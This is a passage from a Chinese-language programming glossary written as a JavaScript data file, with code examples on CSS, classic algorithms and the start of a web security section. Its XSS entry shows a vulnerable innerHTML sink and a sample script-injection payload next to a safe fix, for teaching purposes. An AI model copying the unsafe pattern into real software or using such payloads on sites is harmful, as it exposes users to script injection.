  --warning-color: #f59e0b;

  /* 间距系统 */
  --spacing-xs: 0.25rem;
  --spacing-sm: 0.5rem;
  --spacing-md: 1rem;
  --spacing-lg: 1.5rem;
  --spacing-xl: 2rem;

  /* 字体系统 */
  --font-size-sm: 0.875rem;
  --font-size-base: 1rem;
  --font-size-lg: 1.125rem;
  --font-size-xl: 1.25rem;

  /* 阴影系统 */
  --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.05);
  --shadow-md: 0 4px 6px rgba(0, 0, 0, 0.1);
  --shadow-lg: 0 10px 15px rgba(0, 0, 0, 0.1);
}

/* 使用CSS变量 */
.button {
  background-color: var(--primary-color);
  color: white;
  padding: var(--spacing-md) var(--spacing-lg);
  font-size: var(--font-size-base);
  box-shadow: var(--shadow-md);
  border: none;
  border-radius: 0.375rem;
  transition: all 0.2s;
}

.button:hover {
  background-color: var(--primary-color-dark, #2563eb);
  box-shadow: var(--shadow-lg);
}

/* 主题切换 */
[data-theme="dark"] {
  --primary-color: #60a5fa;
  --background-color: #1f2937;
  --text-color: #f9fafb;
}

/* JavaScript动态更新 */
/*
document.documentElement.style.setProperty('--primary-color', '#ff6b6b');
*/`,
      useCases: ['主题系统', '设计系统', '动态样式', '代码维护'],
      relatedTerms: ['theming', 'design system', 'maintainability', 'dynamic styles']
    },
    {
      id: 'css_4',
      name: 'responsive_design',
      chinese: '响应式设计',
      description: '使网页在不同设备和屏幕尺寸上都能良好显示的设计方法',
      difficulty: 'intermediate',
      tags: ['responsive', 'media-queries', 'mobile'],
      example: `/* 移动优先的响应式设计 */
.container {
  width: 100%;
  padding: 1rem;
  margin: 0 auto;
}

/* 平板设备 */
@media (min-width: 768px) {
  .container {
    max-width: 750px;
    padding: 2rem;
  }

  .grid {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 2rem;
  }
}

/* 桌面设备 */
@media (min-width: 1024px) {
  .container {
    max-width: 1200px;
  }

  .grid {
    grid-template-columns: repeat(3, 1fr);
  }

  .sidebar {
    display: block;
  }
}

/* 大屏设备 */
@media (min-width: 1440px) {
  .container {
    max-width: 1400px;
  }

  .grid {
    grid-template-columns: repeat(4, 1fr);
  }
}

/* 响应式字体 */
.title {
  font-size: clamp(1.5rem, 4vw, 3rem);
  line-height: 1.2;
}

.text {
  font-size: clamp(1rem, 2.5vw, 1.25rem);
}

/* 响应式图片 */
.responsive-image {
  width: 100%;
  height: auto;
  max-width: 100%;
}

/* 现代响应式单位 */
.card {
  width: min(100%, 400px);
  padding: max(1rem, 3vw);
  margin: clamp(1rem, 5vw, 3rem) auto;
}

/* 容器查询 (Container Queries) */
.card-container {
  container-type: inline-size;
}

@container (min-width: 300px) {
  .card {
    display: flex;
    flex-direction: row;
  }
}

@container (min-width: 500px) {
  .card {
    padding: 2rem;
  }

  .card-image {
    width: 40%;
  }

  .card-content {
    width: 60%;
  }
}

/* 响应式导航 */
.nav {
  display: flex;
  flex-direction: column;
}

@media (min-width: 768px) {
  .nav {
    flex-direction: row;
    justify-content: space-between;
    align-items: center;
  }

  .nav-menu {
    display: flex;
    gap: 2rem;
  }

  .nav-toggle {
    display: none;
  }
}

/* 打印样式 */
@media print {
  .no-print {
    display: none;
  }

  .container {
    max-width: none;
    padding: 0;
  }

  body {
    font-size: 12pt;
    line-height: 1.4;
  }
}`,
      useCases: ['多设备适配', '移动端优化', '用户体验', '可访问性'],
      relatedTerms: ['media queries', 'viewport', 'mobile-first', 'container queries']
    },
    {
      id: 'css_5',
      name: 'css_animations',
      chinese: 'CSS动画',
      description: '使用CSS创建平滑的动画效果，包括过渡和关键帧动画',
      difficulty: 'intermediate',
      tags: ['animations', 'transitions', 'keyframes'],
      example: `/* CSS过渡 (Transitions) */
.button {
  background-color: #3b82f6;
  color: white;
  padding: 0.75rem 1.5rem;
  border: none;
  border-radius: 0.5rem;
  cursor: pointer;
  transition: all 0.3s ease;
}

.button:hover {
  background-color: #2563eb;
  transform: translateY(-2px);
  box-shadow: 0 10px 25px rgba(59, 130, 246, 0.3);
}

/* 关键帧动画 (Keyframe Animations) */
@keyframes fadeInUp {
  from {
    opacity: 0;
    transform: translateY(30px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

@keyframes bounce {
  0%, 20%, 53%, 80%, 100% {
    transform: translateY(0);
  }
  40%, 43% {
    transform: translateY(-30px);
  }
  70% {
    transform: translateY(-15px);
  }
  90% {
    transform: translateY(-4px);
  }
}

@keyframes spin {
  from {
    transform: rotate(0deg);
  }
  to {
    transform: rotate(360deg);
  }
}

/* 应用动画 */
.fade-in {
  animation: fadeInUp 0.6s ease-out;
}

.bounce-element {
  animation: bounce 2s infinite;
}

.loading-spinner {
  animation: spin 1s linear infinite;
}

/* 复杂动画序列 */
@keyframes slideInScale {
  0% {
    opacity: 0;
    transform: translateX(-100px) scale(0.8);
  }
  50% {
    opacity: 0.8;
    transform: translateX(0) scale(1.1);
  }
  100% {
    opacity: 1;
    transform: translateX(0) scale(1);
  }
}

.card {
  animation: slideInScale 0.8s cubic-bezier(0.4, 0, 0.2, 1);
}

/* 悬停动画 */
.image-container {
  overflow: hidden;
  border-radius: 0.5rem;
}

.image-container img {
  transition: transform 0.3s ease;
}

.image-container:hover img {
  transform: scale(1.1);
}

/* 文字动画 */
@keyframes typewriter {
  from {
    width: 0;
  }
  to {
    width: 100%;
  }
}

@keyframes blink {
  50% {
    border-color: transparent;
  }
}

.typewriter {
  overflow: hidden;
  border-right: 2px solid #3b82f6;
  white-space: nowrap;
  animation:
    typewriter 3s steps(40, end),
    blink 0.75s step-end infinite;
}

/* 滚动触发动画 */
.scroll-reveal {
  opacity: 0;
  transform: translateY(50px);
  transition: all 0.6s ease;
}

.scroll-reveal.revealed {
  opacity: 1;
  transform: translateY(0);
}

/* 性能优化 */
.optimized-animation {
  will-change: transform, opacity;
  transform: translateZ(0); /* 启用硬件加速 */
}

/* 动画控制 */
.paused {
  animation-play-state: paused;
}

.delayed {
  animation-delay: 0.5s;
}

.slow {
  animation-duration: 2s;
}

/* 响应式动画 */
@media (prefers-reduced-motion: reduce) {
  * {
    animation-duration: 0.01ms !important;
    animation-iteration-count: 1 !important;
    transition-duration: 0.01ms !important;
  }
}`,
      useCases: ['用户交互', '视觉反馈', '页面转场', '加载状态'],
      relatedTerms: ['transitions', 'keyframes', 'transform', 'performance']
    },
    {
      id: 'css_6',
      name: 'css_preprocessors',
      chinese: 'CSS预处理器',
      description: '扩展CSS功能的工具，如Sass、Less，提供变量、嵌套、混合等特性',
      difficulty: 'intermediate',
      tags: ['sass', 'less', 'preprocessing', 'variables'],
      example: `// Sass/SCSS 示例
// _variables.scss
$primary-color: #3b82f6;
$secondary-color: #8b5cf6;
$font-size-base: 1rem;
$font-size-lg: 1.25rem;
$border-radius: 0.5rem;
$spacing-unit: 1rem;

// 颜色函数
$primary-light: lighten($primary-color, 20%);
$primary-dark: darken($primary-color, 20%);

// _mixins.scss
@mixin button-style($bg-color, $text-color: white) {
  background-color: $bg-color;
  color: $text-color;
  padding: $spacing-unit * 0.75 $spacing-unit * 1.5;
  border: none;
  border-radius: $border-radius;
  cursor: pointer;
  transition: all 0.3s ease;

  &:hover {
    background-color: darken($bg-color, 10%);
    transform: translateY(-2px);
  }

  &:active {
    transform: translateY(0);
  }
}

@mixin responsive($breakpoint) {
  @if $breakpoint == mobile {
    @media (max-width: 767px) { @content; }
  }
  @if $breakpoint == tablet {
    @media (min-width: 768px) and (max-width: 1023px) { @content; }
  }
  @if $breakpoint == desktop {
    @media (min-width: 1024px) { @content; }
  }
}

@mixin flex-center {
  display: flex;
  justify-content: center;
  align-items: center;
}

// 主样式文件
.button {
  @include button-style($primary-color);

  &--secondary {
    @include button-style($secondary-color);
  }

  &--large {
    font-size: $font-size-lg;
    padding: $spacing-unit $spacing-unit * 2;
  }
}

.container {
  max-width: 1200px;
  margin: 0 auto;
  padding: $spacing-unit;

  @include responsive(mobile) {
    padding: $spacing-unit * 0.5;
  }

  @include responsive(desktop) {
    padding: $spacing-unit * 2;
  }
}

// 嵌套规则
.navigation {
  background-color: $primary-color;

  ul {
    list-style: none;
    margin: 0;
    padding: 0;
    @include flex-center;

    li {
      margin: 0 $spacing-unit;

      a {
        color: white;
        text-decoration: none;
        padding: $spacing-unit * 0.5;
        border-radius: $border-radius;
        transition: background-color 0.3s ease;

        &:hover {
          background-color: rgba(white, 0.1);
        }

        &.active {
          background-color: rgba(white, 0.2);
          font-weight: bold;
        }
      }
    }
  }
}

// 循环和条件
@for $i from 1 through 12 {
  .col-#{$i} {
    width: percentage($i / 12);
  }
}

$colors: (
  primary: $primary-color,
  secondary: $secondary-color,
  success: #10b981,
  warning: #f59e0b,
  danger: #ef4444
);

@each $name, $color in $colors {
  .text-#{$name} {
    color: $color;
  }

  .bg-#{$name} {
    background-color: $color;
  }

  .border-#{$name} {
    border-color: $color;
  }
}

// 函数
@function rem($pixels) {
  @return #{$pixels / 16}rem;
}

@function z-index($layer) {
  $z-indexes: (
    modal: 1000,
    dropdown: 100,
    header: 50,
    default: 1
  );

  @return map-get($z-indexes, $layer);
}

.modal {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  z-index: z-index(modal);
  background-color: rgba(black, 0.5);
  @include flex-center;
}

// Less 示例
/*
// variables.less
@primary-color: #3b82f6;
@font-size-base: 1rem;
@border-radius: 0.5rem;

// mixins.less
.button-mixin(@bg-color) {
  background-color: @bg-color;
  color: white;
  padding: 0.75rem 1.5rem;
  border: none;
  border-radius: @border-radius;
  cursor: pointer;

  &:hover {
    background-color: darken(@bg-color, 10%);
  }
}

// main.less
.button {
  .button-mixin(@primary-color);
}

.container {
  max-width: 1200px;
  margin: 0 auto;

  .header {
    background-color: @primary-color;

    h1 {
      color: white;
      font-size: @font-size-base * 2;
    }
  }
}
*/`,
      useCases: ['代码组织', '样式复用', '主题管理', '构建优化'],
      relatedTerms: ['sass', 'less', 'variables', 'mixins', 'nesting']
    }
  ],

  // 算法与数据结构 (60个术语)
  algorithms: [
    {
      id: 'algo_1',
      name: 'binary_search',
      chinese: '二分查找',
      description: '在有序数组中查找特定元素的高效算法，时间复杂度O(log n)',
      difficulty: 'intermediate',
      tags: ['search', 'efficiency', 'sorted'],
      example: `function binarySearch(arr, target) {
  let left = 0;
  let right = arr.length - 1;

  while (left <= right) {
    const mid = Math.floor((left + right) / 2);

    if (arr[mid] === target) {
      return mid; // 找到目标，返回索引
    } else if (arr[mid] < target) {
      left = mid + 1; // 目标在右半部分
    } else {
      right = mid - 1; // 目标在左半部分
    }
  }

  return -1; // 未找到目标
}

// 使用示例
const sortedArray = [1, 3, 5, 7, 9, 11, 13, 15, 17, 19];
console.log(binarySearch(sortedArray, 7)); // 输出: 3
console.log(binarySearch(sortedArray, 6)); // 输出: -1`,
      useCases: ['搜索优化', '数据查找', '算法面试', '性能提升'],
      relatedTerms: ['sorting', 'time complexity', 'divide and conquer']
    },
    {
      id: 'algo_2',
      name: 'quicksort',
      chinese: '快速排序',
      description: '基于分治策略的高效排序算法，平均时间复杂度O(n log n)',
      difficulty: 'advanced',
      tags: ['sorting', 'divide-conquer', 'recursion'],
      example: `function quickSort(arr, low = 0, high = arr.length - 1) {
  if (low < high) {
    // 分区操作，返回基准元素的正确位置
    const pivotIndex = partition(arr, low, high);

    // 递归排序基准元素左右两部分
    quickSort(arr, low, pivotIndex - 1);
    quickSort(arr, pivotIndex + 1, high);
  }

  return arr;
}

function partition(arr, low, high) {
  // 选择最后一个元素作为基准
  const pivot = arr[high];
  let i = low - 1; // 较小元素的索引

  for (let j = low; j < high; j++) {
    // 如果当前元素小于或等于基准
    if (arr[j] <= pivot) {
      i++;
      [arr[i], arr[j]] = [arr[j], arr[i]]; // 交换元素
    }
  }

  // 将基准元素放到正确位置
  [arr[i + 1], arr[high]] = [arr[high], arr[i + 1]];
  return i + 1;
}

// 使用示例
const numbers = [64, 34, 25, 12, 22, 11, 90];
console.log('原数组:', numbers);
console.log('排序后:', quickSort([...numbers]));

// 优化版本 - 随机选择基准
function quickSortOptimized(arr, low = 0, high = arr.length - 1) {
  if (low < high) {
    // 随机选择基准以避免最坏情况
    const randomIndex = Math.floor(Math.random() * (high - low + 1)) + low;
    [arr[randomIndex], arr[high]] = [arr[high], arr[randomIndex]];

    const pivotIndex = partition(arr, low, high);
    quickSortOptimized(arr, low, pivotIndex - 1);
    quickSortOptimized(arr, pivotIndex + 1, high);
  }

  return arr;
}`,
      useCases: ['数据排序', '算法竞赛', '系统排序', '性能优化'],
      relatedTerms: ['merge sort', 'partition', 'pivot', 'divide and conquer']
    },
    {
      id: 'algo_3',
      name: 'hash_table',
      chinese: '哈希表',
      description: '基于哈希函数的数据结构，提供O(1)平均时间复杂度的查找、插入和删除',
      difficulty: 'intermediate',
      tags: ['data-structure', 'hashing', 'performance'],
      example: `class HashTable {
  constructor(size = 53) {
    this.keyMap = new Array(size);
  }

  // 哈希函数
  _hash(key) {
    let total = 0;
    let WEIRD_PRIME = 31;
    for (let i = 0; i < Math.min(key.length, 100); i++) {
      let char = key[i];
      let value = char.charCodeAt(0) - 96;
      total = (total * WEIRD_PRIME + value) % this.keyMap.length;
    }
    return total;
  }

  // 设置键值对
  set(key, value) {
    let index = this._hash(key);
    if (!this.keyMap[index]) {
      this.keyMap[index] = [];
    }

    // 检查是否已存在该键
    for (let i = 0; i < this.keyMap[index].length; i++) {
      if (this.keyMap[index][i][0] === key) {
        this.keyMap[index][i][1] = value;
        return;
      }
    }

    // 添加新的键值对
    this.keyMap[index].push([key, value]);
  }

  // 获取值
  get(key) {
    let index = this._hash(key);
    if (this.keyMap[index]) {
      for (let i = 0; i < this.keyMap[index].length; i++) {
        if (this.keyMap[index][i][0] === key) {
          return this.keyMap[index][i][1];
        }
      }
    }
    return undefined;
  }

  // 删除键值对
  delete(key) {
    let index = this._hash(key);
    if (this.keyMap[index]) {
      for (let i = 0; i < this.keyMap[index].length; i++) {
        if (this.keyMap[index][i][0] === key) {
          return this.keyMap[index].splice(i, 1);
        }
      }
    }
    return undefined;
  }

  // 获取所有键
  keys() {
    let keysArr = [];
    for (let i = 0; i < this.keyMap.length; i++) {
      if (this.keyMap[i]) {
        for (let j = 0; j < this.keyMap[i].length; j++) {
          keysArr.push(this.keyMap[i][j][0]);
        }
      }
    }
    return keysArr;
  }

  // 获取所有值
  values() {
    let valuesArr = [];
    for (let i = 0; i < this.keyMap.length; i++) {
      if (this.keyMap[i]) {
        for (let j = 0; j < this.keyMap[i].length; j++) {
          if (!valuesArr.includes(this.keyMap[i][j][1])) {
            valuesArr.push(this.keyMap[i][j][1]);
          }
        }
      }
    }
    return valuesArr;
  }
}

// 使用示例
const ht = new HashTable();
ht.set("hello", "world");
ht.set("dogs", "are cool");
ht.set("cats", "are fine");
ht.set("i love", "pizza");

console.log(ht.get("hello")); // "world"
console.log(ht.keys()); // ["hello", "dogs", "cats", "i love"]
console.log(ht.values()); // ["world", "are cool", "are fine", "pizza"]`,
      useCases: ['缓存系统', '数据库索引', '快速查找', '去重操作'],
      relatedTerms: ['hash function', 'collision', 'load factor', 'dictionary']
    },
    {
      id: 'algo_4',
      name: 'binary_tree',
      chinese: '二叉树',
      description: '每个节点最多有两个子节点的树形数据结构，是许多高级数据结构的基础',
      difficulty: 'intermediate',
      tags: ['data-structure', 'tree', 'recursion'],
      example: `// 二叉树节点定义
class TreeNode {
  constructor(val, left = null, right = null) {
    this.val = val;
    this.left = left;
    this.right = right;
  }
}

// 二叉搜索树实现
class BinarySearchTree {
  constructor() {
    this.root = null;
  }

  // 插入节点
  insert(val) {
    this.root = this._insertNode(this.root, val);
  }

  _insertNode(node, val) {
    if (node === null) {
      return new TreeNode(val);
    }

    if (val < node.val) {
      node.left = this._insertNode(node.left, val);
    } else if (val > node.val) {
      node.right = this._insertNode(node.right, val);
    }

    return node;
  }

  // 搜索节点
  search(val) {
    return this._searchNode(this.root, val);
  }

  _searchNode(node, val) {
    if (node === null || node.val === val) {
      return node;
    }

    if (val < node.val) {
      return this._searchNode(node.left, val);
    } else {
      return this._searchNode(node.right, val);
    }
  }

  // 删除节点
  delete(val) {
    this.root = this._deleteNode(this.root, val);
  }

  _deleteNode(node, val) {
    if (node === null) return null;

    if (val < node.val) {
      node.left = this._deleteNode(node.left, val);
    } else if (val > node.val) {
      node.right = this._deleteNode(node.right, val);
    } else {
      // 找到要删除的节点
      if (node.left === null) return node.right;
      if (node.right === null) return node.left;

      // 有两个子节点：找到右子树的最小值
      let minNode = this._findMin(node.right);
      node.val = minNode.val;
      node.right = this._deleteNode(node.right, minNode.val);
    }

    return node;
  }

  _findMin(node) {
    while (node.left !== null) {
      node = node.left;
    }
    return node;
  }

  // 遍历方法
  inorderTraversal() {
    const result = [];
    this._inorder(this.root, result);
    return result;
  }

  _inorder(node, result) {
    if (node !== null) {
      this._inorder(node.left, result);
      result.push(node.val);
      this._inorder(node.right, result);
    }
  }

  preorderTraversal() {
    const result = [];
    this._preorder(this.root, result);
    return result;
  }

  _preorder(node, result) {
    if (node !== null) {
      result.push(node.val);
      this._preorder(node.left, result);
      this._preorder(node.right, result);
    }
  }

  postorderTraversal() {
    const result = [];
    this._postorder(this.root, result);
    return result;
  }

  _postorder(node, result) {
    if (node !== null) {
      this._postorder(node.left, result);
      this._postorder(node.right, result);
      result.push(node.val);
    }
  }

  // 层序遍历（广度优先）
  levelOrderTraversal() {
    if (!this.root) return [];

    const result = [];
    const queue = [this.root];

    while (queue.length > 0) {
      const node = queue.shift();
      result.push(node.val);

      if (node.left) queue.push(node.left);
      if (node.right) queue.push(node.right);
    }

    return result;
  }

  // 计算树的高度
  height() {
    return this._calculateHeight(this.root);
  }

  _calculateHeight(node) {
    if (node === null) return -1;

    const leftHeight = this._calculateHeight(node.left);
    const rightHeight = this._calculateHeight(node.right);

    return Math.max(leftHeight, rightHeight) + 1;
  }
}

// 使用示例
const bst = new BinarySearchTree();
[50, 30, 70, 20, 40, 60, 80].forEach(val => bst.insert(val));

console.log('中序遍历:', bst.inorderTraversal()); // [20, 30, 40, 50, 60, 70, 80]
console.log('前序遍历:', bst.preorderTraversal()); // [50, 30, 20, 40, 70, 60, 80]
console.log('后序遍历:', bst.postorderTraversal()); // [20, 40, 30, 60, 80, 70, 50]
console.log('层序遍历:', bst.levelOrderTraversal()); // [50, 30, 70, 20, 40, 60, 80]
console.log('树的高度:', bst.height()); // 2`,
      useCases: ['搜索优化', '排序算法', '表达式解析', '文件系统'],
      relatedTerms: ['recursion', 'traversal', 'binary search', 'tree algorithms']
    },
    {
      id: 'algo_5',
      name: 'dynamic_programming',
      chinese: '动态规划',
      description: '通过将复杂问题分解为子问题并存储子问题解的算法设计技术',
      difficulty: 'advanced',
      tags: ['optimization', 'memoization', 'recursion'],
      example: `// 1. 斐波那契数列 - 基础动态规划
function fibonacciDP(n) {
  if (n <= 1) return n;

  const dp = new Array(n + 1);
  dp[0] = 0;
  dp[1] = 1;

  for (let i = 2; i <= n; i++) {
    dp[i] = dp[i - 1] + dp[i - 2];
  }

  return dp[n];
}

// 空间优化版本
function fibonacciOptimized(n) {
  if (n <= 1) return n;

  let prev2 = 0, prev1 = 1;

  for (let i = 2; i <= n; i++) {
    const current = prev1 + prev2;
    prev2 = prev1;
    prev1 = current;
  }

  return prev1;
}

// 2. 最长公共子序列 (LCS)
function longestCommonSubsequence(text1, text2) {
  const m = text1.length;
  const n = text2.length;
  const dp = Array(m + 1).fill().map(() => Array(n + 1).fill(0));

  for (let i = 1; i <= m; i++) {
    for (let j = 1; j <= n; j++) {
      if (text1[i - 1] === text2[j - 1]) {
        dp[i][j] = dp[i - 1][j - 1] + 1;
      } else {
        dp[i][j] = Math.max(dp[i - 1][j], dp[i][j - 1]);
      }
    }
  }

  return dp[m][n];
}

// 3. 0-1背包问题
function knapsack(weights, values, capacity) {
  const n = weights.length;
  const dp = Array(n + 1).fill().map(() => Array(capacity + 1).fill(0));

  for (let i = 1; i <= n; i++) {
    for (let w = 1; w <= capacity; w++) {
      if (weights[i - 1] <= w) {
        dp[i][w] = Math.max(
          dp[i - 1][w], // 不选择当前物品
          dp[i - 1][w - weights[i - 1]] + values[i - 1] // 选择当前物品
        );
      } else {
        dp[i][w] = dp[i - 1][w];
      }
    }
  }

  return dp[n][capacity];
}

// 4. 最长递增子序列 (LIS)
function lengthOfLIS(nums) {
  if (nums.length === 0) return 0;

  const dp = new Array(nums.length).fill(1);

  for (let i = 1; i < nums.length; i++) {
    for (let j = 0; j < i; j++) {
      if (nums[j] < nums[i]) {
        dp[i] = Math.max(dp[i], dp[j] + 1);
      }
    }
  }

  return Math.max(...dp);
}

// 5. 编辑距离 (Levenshtein Distance)
function editDistance(word1, word2) {
  const m = word1.length;
  const n = word2.length;
  const dp = Array(m + 1).fill().map(() => Array(n + 1).fill(0));

  // 初始化边界条件
  for (let i = 0; i <= m; i++) dp[i][0] = i;
  for (let j = 0; j <= n; j++) dp[0][j] = j;

  for (let i = 1; i <= m; i++) {
    for (let j = 1; j <= n; j++) {
      if (word1[i - 1] === word2[j - 1]) {
        dp[i][j] = dp[i - 1][j - 1];
      } else {
        dp[i][j] = Math.min(
          dp[i - 1][j] + 1,     // 删除
          dp[i][j - 1] + 1,     // 插入
          dp[i - 1][j - 1] + 1  // 替换
        );
      }
    }
  }

  return dp[m][n];
}

// 6. 硬币找零问题
function coinChange(coins, amount) {
  const dp = new Array(amount + 1).fill(Infinity);
  dp[0] = 0;

  for (let i = 1; i <= amount; i++) {
    for (const coin of coins) {
      if (coin <= i) {
        dp[i] = Math.min(dp[i], dp[i - coin] + 1);
      }
    }
  }

  return dp[amount] === Infinity ? -1 : dp[amount];
}

// 7. 记忆化递归 (Memoization)
function climbStairs(n, memo = {}) {
  if (n in memo) return memo[n];
  if (n <= 2) return n;

  memo[n] = climbStairs(n - 1, memo) + climbStairs(n - 2, memo);
  return memo[n];
}

// 使用示例
console.log('斐波那契数列第10项:', fibonacciDP(10)); // 55
console.log('LCS长度:', longestCommonSubsequence("abcde", "ace")); // 3
console.log('背包最大价值:', knapsack([1, 3, 4, 5], [1, 4, 5, 7], 7)); // 9
console.log('最长递增子序列:', lengthOfLIS([10, 9, 2, 5, 3, 7, 101, 18])); // 4
console.log('编辑距离:', editDistance("horse", "ros")); // 3
console.log('最少硬币数:', coinChange([1, 3, 4], 6)); // 2`,
      useCases: ['优化问题', '路径规划', '资源分配', '序列分析'],
      relatedTerms: ['memoization', 'optimization', 'recursion', 'subproblems']
    },
    {
      id: 'algo_6',
      name: 'graph_algorithms',
      chinese: '图算法',
      description: '处理图数据结构的算法，包括遍历、最短路径、最小生成树等',
      difficulty: 'advanced',
      tags: ['graph', 'traversal', 'shortest-path'],
      example: `// 图的表示
class Graph {
  constructor() {
    this.adjacencyList = {};
  }

  addVertex(vertex) {
    if (!this.adjacencyList[vertex]) {
      this.adjacencyList[vertex] = [];
    }
  }

  addEdge(v1, v2, weight = 1) {
    this.adjacencyList[v1].push({ node: v2, weight });
    this.adjacencyList[v2].push({ node: v1, weight }); // 无向图
  }

  // 深度优先搜索 (DFS)
  dfs(start) {
    const result = [];
    const visited = {};

    const dfsHelper = (vertex) => {
      visited[vertex] = true;
      result.push(vertex);

      this.adjacencyList[vertex].forEach(neighbor => {
        if (!visited[neighbor.node]) {
          dfsHelper(neighbor.node);
        }
      });
    };

    dfsHelper(start);
    return result;
  }

  // 广度优先搜索 (BFS)
  bfs(start) {
    const queue = [start];
    const result = [];
    const visited = {};
    visited[start] = true;

    while (queue.length) {
      const vertex = queue.shift();
      result.push(vertex);

      this.adjacencyList[vertex].forEach(neighbor => {
        if (!visited[neighbor.node]) {
          visited[neighbor.node] = true;
          queue.push(neighbor.node);
        }
      });
    }

    return result;
  }

  // Dijkstra最短路径算法
  dijkstra(start, end) {
    const distances = {};
    const previous = {};
    const pq = new PriorityQueue();

    // 初始化距离
    for (let vertex in this.adjacencyList) {
      if (vertex === start) {
        distances[vertex] = 0;
        pq.enqueue(vertex, 0);
      } else {
        distances[vertex] = Infinity;
        pq.enqueue(vertex, Infinity);
      }
      previous[vertex] = null;
    }

    while (pq.values.length) {
      const smallest = pq.dequeue().val;

      if (smallest === end) {
        // 构建路径
        const path = [];
        let current = end;
        while (previous[current]) {
          path.push(current);
          current = previous[current];
        }
        path.push(start);
        return {
          distance: distances[end],
          path: path.reverse()
        };
      }

      if (distances[smallest] !== Infinity) {
        this.adjacencyList[smallest].forEach(neighbor => {
          const candidate = distances[smallest] + neighbor.weight;

          if (candidate < distances[neighbor.node]) {
            distances[neighbor.node] = candidate;
            previous[neighbor.node] = smallest;
            pq.enqueue(neighbor.node, candidate);
          }
        });
      }
    }
  }
}

// 优先队列实现
class PriorityQueue {
  constructor() {
    this.values = [];
  }

  enqueue(val, priority) {
    this.values.push({ val, priority });
    this.sort();
  }

  dequeue() {
    return this.values.shift();
  }

  sort() {
    this.values.sort((a, b) => a.priority - b.priority);
  }
}

// 拓扑排序
function topologicalSort(graph) {
  const inDegree = {};
  const queue = [];
  const result = [];

  // 计算入度
  for (let vertex in graph) {
    inDegree[vertex] = 0;
  }

  for (let vertex in graph) {
    graph[vertex].forEach(neighbor => {
      inDegree[neighbor]++;
    });
  }

  // 找到入度为0的节点
  for (let vertex in inDegree) {
    if (inDegree[vertex] === 0) {
      queue.push(vertex);
    }
  }

  while (queue.length) {
    const vertex = queue.shift();
    result.push(vertex);

    graph[vertex].forEach(neighbor => {
      inDegree[neighbor]--;
      if (inDegree[neighbor] === 0) {
        queue.push(neighbor);
      }
    });
  }

  return result.length === Object.keys(graph).length ? result : null;
}

// 检测环
function hasCycle(graph) {
  const visited = {};
  const recStack = {};

  const dfsHelper = (vertex) => {
    visited[vertex] = true;
    recStack[vertex] = true;

    for (let neighbor of graph[vertex] || []) {
      if (!visited[neighbor] && dfsHelper(neighbor)) {
        return true;
      } else if (recStack[neighbor]) {
        return true;
      }
    }

    recStack[vertex] = false;
    return false;
  };

  for (let vertex in graph) {
    if (!visited[vertex] && dfsHelper(vertex)) {
      return true;
    }
  }

  return false;
}

// 使用示例
const graph = new Graph();
['A', 'B', 'C', 'D', 'E', 'F'].forEach(v => graph.addVertex(v));
graph.addEdge('A', 'B', 4);
graph.addEdge('A', 'C', 2);
graph.addEdge('B', 'E', 3);
graph.addEdge('C', 'D', 2);
graph.addEdge('C', 'F', 4);
graph.addEdge('D', 'E', 3);
graph.addEdge('D', 'F', 1);
graph.addEdge('E', 'F', 1);

console.log('DFS遍历:', graph.dfs('A'));
console.log('BFS遍历:', graph.bfs('A'));
console.log('最短路径:', graph.dijkstra('A', 'E'));`,
      useCases: ['社交网络', '路径规划', '网络分析', '依赖管理'],
      relatedTerms: ['dfs', 'bfs', 'dijkstra', 'topological sort']
    },
    {
      id: 'algo_7',
      name: 'sorting_algorithms',
      chinese: '排序算法',
      description: '将数据按特定顺序排列的算法，包括冒泡排序、快速排序、归并排序等',
      difficulty: 'intermediate',
      tags: ['sorting', 'algorithms', 'comparison'],
      example: `// 冒泡排序
function bubbleSort(arr) {
    const n = arr.length;
    for (let i = 0; i < n - 1; i++) {
        for (let j = 0; j < n - i - 1; j++) {
            if (arr[j] > arr[j + 1]) {
                [arr[j], arr[j + 1]] = [arr[j + 1], arr[j]];
            }
        }
    }
    return arr;
}

// 快速排序
function quickSort(arr) {
    if (arr.length <= 1) return arr;

    const pivot = arr[Math.floor(arr.length / 2)];
    const left = arr.filter(x => x < pivot);
    const middle = arr.filter(x => x === pivot);
    const right = arr.filter(x => x > pivot);

    return [...quickSort(left), ...middle, ...quickSort(right)];
}

// 归并排序
function mergeSort(arr) {
    if (arr.length <= 1) return arr;

    const mid = Math.floor(arr.length / 2);
    const left = mergeSort(arr.slice(0, mid));
    const right = mergeSort(arr.slice(mid));

    return merge(left, right);
}

function merge(left, right) {
    const result = [];
    let i = 0, j = 0;

    while (i < left.length && j < right.length) {
        if (left[i] <= right[j]) {
            result.push(left[i++]);
        } else {
            result.push(right[j++]);
        }
    }

    return result.concat(left.slice(i)).concat(right.slice(j));
}

// 插入排序
function insertionSort(arr) {
    for (let i = 1; i < arr.length; i++) {
        let key = arr[i];
        let j = i - 1;

        while (j >= 0 && arr[j] > key) {
            arr[j + 1] = arr[j];
            j--;
        }
        arr[j + 1] = key;
    }
    return arr;
}

// 选择排序
function selectionSort(arr) {
    const n = arr.length;
    for (let i = 0; i < n - 1; i++) {
        let minIdx = i;
        for (let j = i + 1; j < n; j++) {
            if (arr[j] < arr[minIdx]) {
                minIdx = j;
            }
        }
        if (minIdx !== i) {
            [arr[i], arr[minIdx]] = [arr[minIdx], arr[i]];
        }
    }
    return arr;
}

// 使用示例
const numbers = [64, 34, 25, 12, 22, 11, 90];
console.log("原数组:", numbers);
console.log("冒泡排序:", bubbleSort([...numbers]));
console.log("快速排序:", quickSort([...numbers]));
console.log("归并排序:", mergeSort([...numbers]));`,
      useCases: ['数据排序', '搜索优化', '数据库索引', '算法竞赛'],
      relatedTerms: ['time complexity', 'space complexity', 'stable sorting', 'comparison sorting']
    }
  ],

  // Web安全 (40个术语)
  security: [
    {
      id: 'sec_1',
      name: 'xss',
      chinese: '跨站脚本攻击',
      description: '恶意脚本注入到可信网站的安全漏洞',
      difficulty: 'advanced',
      tags: ['security', 'injection', 'client-side'],
      example: `// 危险代码 - 容易受到XSS攻击
function displayUserComment(comment) {
  document.getElementById('comments').innerHTML = comment;
  // 如果comment包含<script>alert('XSS')</script>，会执行恶意代码
}

// 安全代码 - 防范XSS攻击
function displayUserCommentSafe(comment) {
  // 方法1: 使用textContent而不是innerHTML
  const commentElement = document.createElement('div');
  commentElement.textContent = comment;
  document.getElementById('comments').appendChild(commentElement);

